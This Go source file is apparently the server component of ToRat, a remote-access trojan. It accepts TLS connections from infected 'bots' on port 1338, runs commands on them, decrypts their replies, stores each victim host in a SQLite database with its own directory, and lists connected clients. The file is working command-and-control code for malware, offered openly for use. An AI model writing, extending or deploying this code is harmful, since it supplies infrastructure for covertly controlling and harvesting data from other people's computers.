package server

import (
	"crypto/tls"
	"fmt"
	"log"
	"net"
	"os"
	"path/filepath"
	"strconv"

	"github.com/fatih/color"
	"github.com/jinzhu/gorm"
	_ "github.com/jinzhu/gorm/dialects/sqlite" //sqlite
	"github.com/lu4p/ToRat/torat_server/crypto"
)

const port = ":1338"

var db *gorm.DB

var activeClients []activeClient

// Start runs the server
func Start() {
	db, _ = gorm.Open("sqlite3", "ToRat.db")
	defer db.Close()

	// Migrate the schema
	db.AutoMigrate(&client{})

	cert, err := tls.LoadX509KeyPair("cert.pem", "key.pem")
	if err != nil {
		log.Println("could not load cert", err)
		return
	}
	config := tls.Config{Certificates: []tls.Certificate{cert}}
	ln, err := net.Listen("tcp", port)
	if err != nil {
		fmt.Println(err)
		return
	}
	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Println("accepting failed:", err)
			continue
		}
		//log.Println("got new connection")
		tlsconn := tls.Server(conn, &config)
		go accept(tlsconn)
	}
}

func accept(conn net.Conn) {
	var c activeClient
	c.Conn = conn
	encHostname, err := c.runCommandByte("hostname")
	if err != nil {
		log.Println("Invalid Hostname", err)
		return
	}
	log.Println("Len Hostname", len(encHostname))
	hostname, err := crypto.DecAsym(encHostname)
	if err != nil {
		log.Println("Invalid Hostname", err)
		return
	}
	c.Hostname = string(hostname)
	c.Client = &client{Hostname: string(hostname), Path: filepath.Join("bots", c.Hostname)}
	db.FirstOrCreate(&c.Client, client{Hostname: string(hostname)})
	log.Println("success")

	if _, err = os.Stat(c.Client.Path); err != nil {
		os.MkdirAll(c.Client.Path, os.ModePerm)
	}
	if c.Client.Name == "" {
		c.Client.Name = c.Client.Hostname
	}
	db.Save(&c.Client)
	activeClients = append(activeClients, c)
	fmt.Println(green("[+] New Client"), blue(c.Client.Name), green("connected!"))
}

func listConn() []string {
	var clients []string
	for i, c := range activeClients {
		str := strconv.Itoa(i) + "\t" + c.Client.Hostname + "\t" + c.Client.Name
		clients = append(clients, str)
	}
	return clients
}

func printClients() {
	color.HiCyan("Clients:")
	list := listConn()
	for _, client := range list {
		color.Cyan(client)
	}
}

func getClient(target int) *activeClient {
	return &activeClients[target]
}
